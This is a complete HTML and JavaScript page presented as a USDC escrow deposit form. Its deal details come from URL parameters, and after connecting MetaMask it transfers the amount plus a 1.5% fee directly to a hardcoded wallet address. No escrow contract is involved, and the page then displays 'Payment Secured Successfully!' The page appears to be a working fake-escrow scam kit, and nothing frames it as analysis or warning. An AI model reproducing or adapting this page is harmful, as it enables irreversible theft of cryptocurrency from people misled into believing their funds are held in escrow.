<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Escrow Deposit (USDC)</title>
<style>
  body { background:#0f172a; font-family:'Inter',sans-serif; margin:0; padding:20px; display:flex; justify-content:center; }
  #escrowDepositApp{ max-width:480px; background:#0f172a; color:white; padding:30px; border-radius:16px; box-shadow:0 15px 40px rgba(0,0,0,0.5); }
  #escrowDepositApp h2{ margin-top:0; font-weight:600; text-align:center; margin-bottom:20px; }
  .summaryBox{ background:#1e293b; padding:15px; border-radius:12px; margin-bottom:15px; font-size:14px; border:1px solid #334155; }
  .summaryBox p { margin:8px 0; }
  button{ margin-top:10px; width:100%; padding:14px; border:none; border-radius:12px; font-weight:600; font-size:16px; cursor:pointer; transition:0.3s; }
  .connectBtn{ background:#6366f1; color:white; }
  .payBtn{ background:#22c55e; color:white; }
  .payBtn:disabled { background:#14532d; cursor:not-allowed; opacity:0.6; }
  #status{ margin-top:15px; font-size:13px; color:#38bdf8; font-weight:500; text-align:center; }
</style>
</head>
<body>
<div id="escrowDepositApp">
<h2>Escrow Deposit (USDC)</h2>

<div class="summaryBox">
  <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
    <span style="color:#94a3b8">Deal ID</span>
    <strong id="dealID">Loading...</strong>
  </div>
  <p>Buyer: <span id="buyer">-</span></p>
  <p>Seller: <span id="seller">-</span></p>
  <p>Asset: <span id="assetType">-</span></p>
  <hr style="border:0; border-top:1px solid #334155; margin:10px 0;">
  <p>Amount: <strong id="amountDisplay" style="font-size:18px; color:#22c55e">0.00</strong> USDC</p>
  <div id="feeDisplay" style="font-size:12px; color:#94a3b8;">Fee (1.5%): 0.00 USDC</div>
</div>

<div class="summaryBox" style="background:#020617">
  <small style="color:#94a3b8">Wallet Status</small><br>
  <span id="wallet" style="font-family:monospace">Not Connected</span>
</div>

<div id="actionArea">
  <button class="connectBtn" id="btnMetaMask" onclick="connectMetaMask()">Connect MetaMask</button>
</div>

<button class="payBtn" id="btnPay" onclick="sendPayment()" disabled>Send Escrow Deposit</button>

<div id="status">Please connect your wallet</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
<script>
let provider, signer;
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const RECEIVER_ADDRESS = "0xAEff38fd17B4bA0e5FC40115441C348aa789E706";
let finalTotalString = "0";

// Load deal info from URL
function loadDealData(){
  const params = new URLSearchParams(window.location.search);
  const rawAmount = (params.get("amount") || "0").replace(',', '.').replace(/[^0-9.]/g, '');
  const numAmount = parseFloat(rawAmount) || 0;
  const fee = numAmount * 0.015;
  const total = numAmount + fee;
  finalTotalString = total.toFixed(6);

  document.getElementById("dealID").innerText = params.get("dealID") || "N/A";
  document.getElementById("buyer").innerText = params.get("buyer") || "N/A";
  document.getElementById("seller").innerText = params.get("seller") || "N/A";
  document.getElementById("assetType").innerText = params.get("assetType") || "N/A";
  document.getElementById("amountDisplay").innerText = numAmount.toLocaleString('en-US',{minimumFractionDigits:2, maximumFractionDigits:2});
  document.getElementById("feeDisplay").innerText = `Fee (1.5%): ${fee.toFixed(2)} USDC`;
}
window.addEventListener('load', loadDealData);

// Connect MetaMask or redirect to install
async function connectMetaMask(){
  const status = document.getElementById("status");
  if(!window.ethereum){
    const goInstall = confirm("MetaMask not found. Install MetaMask to proceed?");
    if(goInstall) window.location.href = "https://metamask.io/download.html";
    return;
  }
  try{
    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    const address = await signer.getAddress();
    document.getElementById("wallet").innerText = address.slice(0,10)+"..."+address.slice(-8);
    document.getElementById("btnMetaMask").style.display = "none";
    document.getElementById("btnPay").disabled = false;
    status.innerText = "Connected! Ready to pay.";
    status.style.color = "#22c55e";
  } catch(err){
    console.error(err);
    status.innerText = "Connection failed. Please refresh and try again.";
    status.style.color = "#ef4444";
  }
}

// Send USDC to hardcoded receiver
async function sendPayment(){
  const btn = document.getElementById("btnPay");
  const status = document.getElementById("status");
  if(!signer || finalTotalString === "0") return;
  try{
    btn.disabled = true;
    btn.innerText = "Confirm in Wallet...";
    const usdcAbi = ["function transfer(address to,uint256 amount) public returns (bool)"];
    const contract = new ethers.Contract(USDC_ADDRESS, usdcAbi, signer);
    const value = ethers.utils.parseUnits(finalTotalString, 6);
    const tx = await contract.transfer(RECEIVER_ADDRESS, value);
    status.innerText = "Transaction pending...";
    status.style.color = "#38bdf8";
    await tx.wait();
    status.innerText = "Payment Secured Successfully!";
    status.style.color = "#22c55e";
    btn.innerText = "Verified ✔";
  } catch(e){
    console.error(e);
    btn.disabled = false;
    btn.innerText = "Send Escrow Deposit";
    status.innerText = "Transaction failed or cancelled.";
    status.style.color = "#ef4444";
  }
}
</script>
</body>
</html>
